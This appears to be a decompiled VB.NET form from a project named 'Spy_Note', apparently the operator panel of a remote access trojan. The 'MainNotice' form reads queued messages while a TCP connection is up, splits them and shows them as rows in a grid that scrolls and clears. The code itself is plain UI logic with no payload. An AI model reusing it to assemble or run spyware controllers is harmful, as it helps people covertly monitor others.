Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class MainNotice

    Public AddNew As List(Of String)
    Private loop_0 As Integer
    Public Delegate Sub StringArgReturningVoidDelegate(text As String)
    Public Sub New()
        Me.AddNew = New List(Of String)()
        Me.loop_0 = 0
        Me.InitializeComponent()
    End Sub
    Private Sub MainNotice_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim workingArea As Rectangle = Screen.PrimaryScreen.WorkingArea
        MyBase.Left = workingArea.Width - MyBase.Width - 5
        MyBase.Top = workingArea.Height - MyBase.Height - 5
        Dim thread As New Thread(New ThreadStart(AddressOf Me.Thread_1))
        thread.Start()
    End Sub

    Private Sub Thread_1()
        Dim num As Integer = 0
        While My.Forms.Form1.s.TcpState
            Dim flag As Boolean = Me.AddNew.Count <> 0
            If flag Then
                Dim flag2 As Boolean = Me.AddNew.Count = num
                If flag2 Then
                    num = 0
                    Me.AddNew.Clear()
                Else
                    Dim flag3 As Boolean = Operators.CompareString(Me.AddNew(num), Nothing, False) <> 0
                    If flag3 Then
                        Me.SetText(Me.AddNew(num))
                        Me.AddNew(num) = Nothing
                    End If
                    num += 1
                End If
            End If
            Thread.Sleep(store_0.CPU)
        End While
    End Sub

    Private Sub SetText(text As String)
        Dim invokeRequired As Boolean = Me.DataGridView1.InvokeRequired
        If invokeRequired Then
            Dim method As MainNotice.StringArgReturningVoidDelegate = AddressOf Me.SetText
            MyBase.Invoke(method, New Object() {text})
        Else
            Dim flag As Boolean = text.Contains(My.Forms.Form1.s.split_Ary)
            If flag Then
                Dim separator As String() = New String() {My.Forms.Form1.s.split_Ary}
                Dim array As String() = text.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Dim flag2 As Boolean = Not Me.DataGridView1.Visible
                If flag2 Then
                    Me.DataGridView1.Visible = True
                End If
                Me.DataGridView1.Rows.Add(New Object() {My.Forms.Form1.imageList_0.Images(Conversions.ToInteger(array(0))), array(1), array(2), array(3)})
                Dim flag3 As Boolean = Me.DataGridView1.Rows.Count > 7
                If flag3 Then
                    Me.DataGridView1.Rows.RemoveAt(0)
                End If
                Dim flag4 As Boolean = Me.DataGridView1.Rows.Count <> 0
                If flag4 Then
                    Me.ToEnd()
                End If
            End If
        End If
    End Sub

    Private Sub ToEnd()
        Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
        Me.DataGridView1.CurrentCell = Nothing
        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
        Me.loop_0 = 0
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim flag As Boolean = Me.DataGridView1.Location.Y >= 2
        If flag Then
            Dim num As Integer = Me.DataGridView1.Location.Y
            num -= 2
            Me.DataGridView1.Location = New Point(3, num)
        Else
            Me.loop_0 += 1
            Dim flag2 As Boolean = Me.loop_0 >= 400
            If flag2 Then
                Me.DataGridView1.Rows.Clear()
                Me.DataGridView1.Location = New Point(3, 132)
                Me.loop_0 = 0
                Me.Timer1.Enabled = False
            End If
        End If
    End Sub

    Private Sub DataGridView1_MouseClick(sender As Object, e As MouseEventArgs) Handles DataGridView1.MouseClick
        Me.DataGridView1.Visible = False
    End Sub
End Class